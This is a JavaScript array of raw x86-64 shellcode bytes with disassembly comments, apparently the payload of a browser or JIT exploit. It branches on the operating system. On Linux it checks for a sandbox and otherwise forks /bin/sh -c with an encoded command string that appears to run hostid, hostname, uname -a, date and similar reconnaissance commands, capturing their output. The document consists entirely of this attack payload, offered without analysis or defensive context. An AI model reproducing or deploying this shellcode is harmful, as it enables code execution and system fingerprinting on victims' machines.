let shellcode = [
    0x41, 0x8c, 0xec,                        // 00: MOV r12d, gs
    0x4d, 0x85, 0xe4,                        // 01: TEST r12, r12
    0x0f, 0x84, 0x3b, 0x00, 0x00, 0x00,      // 02: JZ :Linux => 0x0047
    // Windows shellcode
    0x49, 0x89, 0xc4,                        // 03: MOV r12, rax
    0x48, 0x31, 0xc9,                        // 04: XOR rcx, rcx
    0x65, 0x48, 0x8b, 0x41, 0x60,            // 05: MOV(rax, gs:[rcx+0x60])
    0x48, 0x8b, 0x40, 0x20,                  // 06: MOV rax, [rax + 32]
    0x66, 0x8b, 0x48, 0x70,                  // 07: MOV cx, [rax + 112]
    0x48, 0x8b, 0x40, 0x78,                  // 08: MOV rax, [rax + 120]
    // loop [0x0023]:
    0x44, 0x8a, 0x18,                        // 09: MOV r11b, [rax]
    0x45, 0x88, 0x1c, 0x24,                  // 10: MOV [r12], r11b
    0x48, 0xff, 0xc0,                        // 11: INC rax
    0x49, 0xff, 0xc4,                        // 12: INC r12
    0x48, 0xff, 0xc9,                        // 13: DEC rcx
    0x48, 0x85, 0xc9,                        // 14: TEST rcx, rcx
    0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 15: JNZ :loop => 0x0023
    0x68, 0x00, 0x01, 0x00, 0x00,            // 16: PUSH 256
    0x58,                                    // 17: POP rax
    0xe9, 0xea, 0x01, 0x00, 0x00,            // 18: JMP :return => 0x0231
    // Linux [0x0047]:
    0x49, 0x89, 0xc4,                        // 19: MOV r12, rax
    0x68, 0x2f, 0x00, 0x00, 0x2f,            // 20: PUSH 788529199
    0x31, 0xd2,                              // 21: XOR edx, edx
    0x31, 0xf6,                              // 22: XOR esi, esi
    0x48, 0x89, 0xe7,                        // 23: MOV rdi, rsp
    0xb8, 0x02, 0x00, 0x00, 0x00,            // 24: MOV eax, 2
    0x0f, 0x05,                              // 25: SYSCALL
    0x5f,                                    // 26: POP rdi
    0x48, 0xc1, 0xe8, 0x3f,                  // 27: SHR rax, 63
    0x85, 0xc0,                              // 28: TEST eax, eax
    0x4c, 0x89, 0xe0,                        // 29: MOV rax, r12
    0x0f, 0x85, 0x62, 0x01, 0x00, 0x00,      // 30: JNZ :LinuxSandbox => 0x01cf
    // LinuxForkExec [0x006d]:
    0x48, 0x89, 0xc3,                        // 31: MOV rbx, rax
    // pipe(link)
    0x6a, 0x00,                              // 32: PUSH 0
    0xb8, 0x16, 0x00, 0x00, 0x00,            // 33: MOV eax, 22
    0x48, 0x89, 0xe7,                        // 34: MOV rdi, rsp
    0x0f, 0x05,                              // 35: SYSCALL
    0x41, 0x59,                              // 36: POP r9
    0x45, 0x89, 0xc8,                        // 37: MOV r8d, r9d
    0x49, 0xc1, 0xe9, 0x20,                  // 38: SHR r9, 32
    0xb8, 0x39, 0x00, 0x00, 0x00,            // 39: MOV eax, 57
    0x0f, 0x05,                              // 40: SYSCALL
    0x48, 0x85, 0xc0,                        // 41: TEST rax, rax
    0x0f, 0x85, 0xfd, 0x00, 0x00, 0x00,      // 42: JNZ :parent => 0x0192
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0xb8, 0x21, 0x00, 0x00, 0x00,            // 43: MOV eax, 33
    0x4c, 0x89, 0xcf,                        // 44: MOV rdi, r9
    0xbe, 0x01, 0x00, 0x00, 0x00,            // 45: MOV esi, 1
    0x0f, 0x05,                              // 46: SYSCALL
    // close(link[0])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 47: MOV eax, 3
    0x4c, 0x89, 0xc7,                        // 48: MOV rdi, r8
    0x0f, 0x05,                              // 49: SYSCALL
    // close(link[1])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 50: MOV eax, 3
    0x4c, 0x89, 0xcf,                        // 51: MOV rdi, r9
    0x0f, 0x05,                              // 52: SYSCALL
    0x31, 0xc0,                              // 53: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 54: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 55: OR rax, 0
    0x50,                                    // 56: PUSH rax
    0x31, 0xc0,                              // 57: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 58: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 59: OR rax, 0
    0x50,                                    // 60: PUSH rax
    0xb8, 0x2f, 0x2f, 0x73, 0x68,            // 61: MOV eax, 1752379183
    0x48, 0xc1, 0xe0, 0x20,                  // 62: SHL rax, 32
    0x48, 0x0d, 0x2f, 0x62, 0x69, 0x6e,      // 63: OR rax, 1852400175
    0x50,                                    // 64: PUSH rax
    0x54,                                    // 65: PUSH rsp
    0x41, 0x58,                              // 66: POP r8
    0x31, 0xc0,                              // 67: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 68: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 69: OR rax, 0
    0x50,                                    // 70: PUSH rax
    0x31, 0xc0,                              // 71: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 72: SHL rax, 32
    0x48, 0x0d, 0x2d, 0x63, 0x00, 0x00,      // 73: OR rax, 25389
    0x50,                                    // 74: PUSH rax
    0x54,                                    // 75: PUSH rsp
    0x41, 0x59,                              // 76: POP r9
    0x31, 0xc0,                              // 77: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 78: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 79: OR rax, 0
    0x50,                                    // 80: PUSH rax
    0x31, 0xc0,                              // 81: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 82: SHL rax, 32
    0x48, 0x0d, 0x69, 0x6d, 0x65, 0x3b,      // 83: OR rax, 996502889
    0x50,                                    // 84: PUSH rax
    0xb8, 0x2f, 0x75, 0x70, 0x74,            // 85: MOV eax, 1953527087
    0x48, 0xc1, 0xe0, 0x20,                  // 86: SHL rax, 32
    0x48, 0x0d, 0x70, 0x72, 0x6f, 0x63,      // 87: OR rax, 1668248176
    0x50,                                    // 88: PUSH rax
    0xb8, 0x61, 0x74, 0x20, 0x2f,            // 89: MOV eax, 790656097
    0x48, 0xc1, 0xe0, 0x20,                  // 90: SHL rax, 32
    0x48, 0x0d, 0x65, 0x3b, 0x20, 0x63,      // 91: OR rax, 1663056741
    0x50,                                    // 92: PUSH rax
    0xb8, 0x20, 0x64, 0x61, 0x74,            // 93: MOV eax, 1952539680
    0x48, 0xc1, 0xe0, 0x20,                  // 94: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2d, 0x61, 0x3b,      // 95: OR rax, 996224288
    0x50,                                    // 96: PUSH rax
    0xb8, 0x6e, 0x61, 0x6d, 0x65,            // 97: MOV eax, 1701667182
    0x48, 0xc1, 0xe0, 0x20,                  // 98: SHL rax, 32
    0x48, 0x0d, 0x64, 0x3b, 0x20, 0x75,      // 99: OR rax, 1965046628
    0x50,                                    // 100: PUSH rax
    0xb8, 0x3b, 0x20, 0x70, 0x77,            // 101: MOV eax, 2003836987
    0x48, 0xc1, 0xe0, 0x20,                  // 102: SHL rax, 32
    0x48, 0x0d, 0x6e, 0x61, 0x6d, 0x65,      // 103: OR rax, 1701667182
    0x50,                                    // 104: PUSH rax
    0xb8, 0x68, 0x6f, 0x73, 0x74,            // 105: MOV eax, 1953722216
    0x48, 0xc1, 0xe0, 0x20,                  // 106: SHL rax, 32
    0x48, 0x0d, 0x69, 0x64, 0x3b, 0x20,      // 107: OR rax, 540763241
    0x50,                                    // 108: PUSH rax
    0x54,                                    // 109: PUSH rsp
    0x41, 0x5a,                              // 110: POP r10
    0x6a, 0x00,                              // 111: PUSH 0
    0x41, 0x52,                              // 112: PUSH r10
    0x41, 0x51,                              // 113: PUSH r9
    0x41, 0x50,                              // 114: PUSH r8
    0x54,                                    // 115: PUSH rsp
    0x41, 0x5a,                              // 116: POP r10
    0xb8, 0x3b, 0x00, 0x00, 0x00,            // 117: MOV eax, 59
    0x4c, 0x89, 0xd6,                        // 118: MOV rsi, r10
    0x48, 0x8b, 0x3e,                        // 119: MOV rdi, [rsi]
    0x48, 0x31, 0xd2,                        // 120: XOR rdx, rdx
    0x0f, 0x05,                              // 121: SYSCALL
    // parent [0x0192]:
    // Fork Parent
    // close(link[1])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 122: MOV eax, 3
    0x4c, 0x89, 0xcf,                        // 123: MOV rdi, r9
    0x0f, 0x05,                              // 124: SYSCALL
    0xba, 0x00, 0x10, 0x00, 0x00,            // 125: MOV edx, 4096
    // read [0x01a1]:
    // read(link[0], rbx, 4096)
    0x48, 0x31, 0xc0,                        // 126: XOR rax, rax
    0x4c, 0x89, 0xc7,                        // 127: MOV rdi, r8
    0x48, 0x89, 0xde,                        // 128: MOV rsi, rbx
    0x0f, 0x05,                              // 129: SYSCALL
    0x48, 0x01, 0xc3,                        // 130: ADD rbx, rax
    0x29, 0xc2,                              // 131: SUB edx, eax
    0x48, 0x85, 0xc0,                        // 132: TEST rax, rax
    0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 133: JNZ :read => 0x01a1
    // close(link[0])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 134: MOV eax, 3
    0x4c, 0x89, 0xc7,                        // 135: MOV rdi, r8
    0x0f, 0x05,                              // 136: SYSCALL
    0x68, 0x80, 0x00, 0x00, 0x00,            // 137: PUSH 128
    0x58,                                    // 138: POP rax
    0xe9, 0x62, 0x00, 0x00, 0x00,            // 139: JMP :return => 0x0231
    // LinuxSandbox [0x01cf]:
    0x48, 0x89, 0xc7,                        // 140: MOV rdi, rax
    0xb8, 0x66, 0x00, 0x00, 0x00,            // 141: MOV eax, 102
    0x0f, 0x05,                              // 142: SYSCALL
    0x48, 0x89, 0xfb,                        // 143: MOV rbx, rdi
    0xb9, 0x0a, 0x00, 0x00, 0x00,            // 144: MOV ecx, 10
    // convert_loop [0x01e1]:
    0x31, 0xd2,                              // 145: XOR edx, edx
    0xf7, 0xf1,                              // 146: DIV ecx
    0x83, 0xc2, 0x30,                        // 147: ADD edx, 48
    0x89, 0x13,                              // 148: MOV [rbx], edx
    0x48, 0xff, 0xc3,                        // 149: INC rbx
    0x85, 0xc0,                              // 150: TEST eax, eax
    0x90,                                    // 151: NOP
    0x90,                                    // 152: NOP
    0x0f, 0x85, 0xea, 0xff, 0xff, 0xff,      // 153: JNZ :convert_loop => 0x01e1
    0x48, 0xff, 0xcb,                        // 154: DEC rbx
    0x48, 0x89, 0xda,                        // 155: MOV rdx, rbx
    0x48, 0x89, 0xf9,                        // 156: MOV rcx, rdi
    // reverse_loop [0x0200]:
    0x8a, 0x07,                              // 157: MOV al, [rdi]
    0x8a, 0x1a,                              // 158: MOV bl, [rdx]
    0x88, 0x1f,                              // 159: MOV [rdi], bl
    0x88, 0x02,                              // 160: MOV [rdx], al
    0x48, 0xff, 0xc7,                        // 161: INC rdi
    0x48, 0xff, 0xca,                        // 162: DEC rdx
    0x48, 0x39, 0xd7,                        // 163: CMP rdi, rdx
    0x0f, 0x8c, 0xe9, 0xff, 0xff, 0xff,      // 164: JMP :reverse_loop => 0x0200
    0x48, 0x01, 0xd7,                        // 165: ADD rdi, rdx
    0x48, 0x29, 0xcf,                        // 166: SUB rdi, rcx
    0x48, 0xff, 0xc7,                        // 167: INC rdi
    0x31, 0xc9,                              // 168: XOR ecx, ecx
    0x89, 0x0f,                              // 169: MOV [rdi], ecx
    0x48, 0xff, 0xc7,                        // 170: INC rdi
    0xb8, 0x3f, 0x00, 0x00, 0x00,            // 171: MOV eax, 63
    0x0f, 0x05,                              // 172: SYSCALL
    0x6a, 0x40,                              // 173: PUSH 64
    0x58,                                    // 174: POP rax
    // return [0x0231]:
    0xc3,                                    // 175: RET
];
